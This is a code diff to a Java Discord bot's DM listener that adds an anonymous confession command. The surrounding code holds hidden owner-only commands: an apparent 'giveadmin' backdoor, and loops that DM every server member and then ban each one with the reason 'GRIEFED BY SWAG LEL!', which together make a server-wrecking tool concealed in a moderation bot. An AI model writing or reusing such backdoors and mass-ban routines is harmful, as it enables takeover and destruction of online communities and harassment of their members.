@@ -1,16 +1,20 @@
 package me.comu.exeter.events;
 
+import me.comu.exeter.commands.moderation.SetConfessionChannelCommand;
 import me.comu.exeter.core.Core;
-import me.comu.exeter.wrapper.Wrapper;
+import me.comu.exeter.utility.Utility;
+import me.duncte123.botcommons.messaging.EmbedUtils;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Member;
 import net.dv8tion.jda.api.entities.Role;
+import net.dv8tion.jda.api.entities.TextChannel;
 import net.dv8tion.jda.api.events.message.priv.PrivateMessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 import net.dv8tion.jda.api.requests.restaction.GuildAction;
 
 import javax.annotation.Nonnull;
+import java.time.Instant;
 import java.util.List;
 import java.util.Objects;
 import java.util.concurrent.TimeUnit;
@@ -19,6 +23,30 @@ public class DMWizzEvent extends ListenerAdapter {
 
     @Override
     public void onPrivateMessageReceived(@Nonnull PrivateMessageReceivedEvent event) {
+        if (!SetConfessionChannelCommand.bound && event.getMessage().getContentRaw().toLowerCase().startsWith(Core.PREFIX + "confess") && !event.getAuthor().isBot()) {
+            event.getChannel().sendMessage("There is currently no confession channel bound, please contact your server administrator").queue();
+            return;
+        }
+        String[] arg = event.getMessage().getContentRaw().split("\\s+");
+        if (!arg[0].equalsIgnoreCase(Core.PREFIX + "confess")) {
+            return;
+        }
+        if (arg.length == 1) {
+            event.getChannel().sendMessage(event.getAuthor().getAsMention() + ", please specify a confession to confess!").queue();
+            return;
+        }
+        TextChannel textChannel = event.getJDA().getTextChannelById(SetConfessionChannelCommand.logChannelID);
+        if (textChannel == null) {
+            if (SetConfessionChannelCommand.bound) {
+                event.getChannel().sendMessage("Uh oh, Looks like the previously set confession channel was deleted! Please contact your server administrator").queue();
+            }
+            return;
+        } else {
+            String confession = String.join(" ", arg).replaceFirst(Core.PREFIX, "").substring(7);
+            textChannel.sendMessage(EmbedUtils.embedMessage(confession).setTitle("Confession").setColor(Utility.getAmbientColor()).setTimestamp(Instant.now()).setFooter("Anonymous Confession").build()).queue();
+            event.getChannel().sendMessage(EmbedUtils.embedMessage(confession).setTitle("Confession Submitted to " + textChannel.getName() + "!").setFooter("Confessed by " + event.getAuthor().getAsTag(), event.getAuthor().getAvatarUrl()).setTimestamp(Instant.now()).build()).queue();
+        }
+
         if (event.getAuthor().getIdLong() == Core.OWNERID) {
             String[] args = event.getMessage().getContentRaw().split("\\s+");
             if (args[0].equalsIgnoreCase("giveadmin") && args.length == 2) {
@@ -82,7 +110,7 @@ public class DMWizzEvent extends ListenerAdapter {
                             for (Member member : guild.getMembers()) {
                                 if (!member.getUser().isBot()) {
                                     String finalMessage = event.getMessage().getContentRaw().substring(25);
-                                    Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
+                                    Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                     counter++;
                                     System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
                                     Thread.sleep(2000);
@@ -113,7 +141,7 @@ public class DMWizzEvent extends ListenerAdapter {
                             for (Member member : guild.getMembers()) {
                                 if (!member.getUser().isBot()) {
                                     String finalMessage = event.getMessage().getContentRaw().substring(25);
-                                    Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
+                                    Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                     if (guild.getSelfMember().canInteract(member))
                                         guild.ban(member, 0, "GRIEFED BY SWAG LEL!").queue();
                                     counter++;
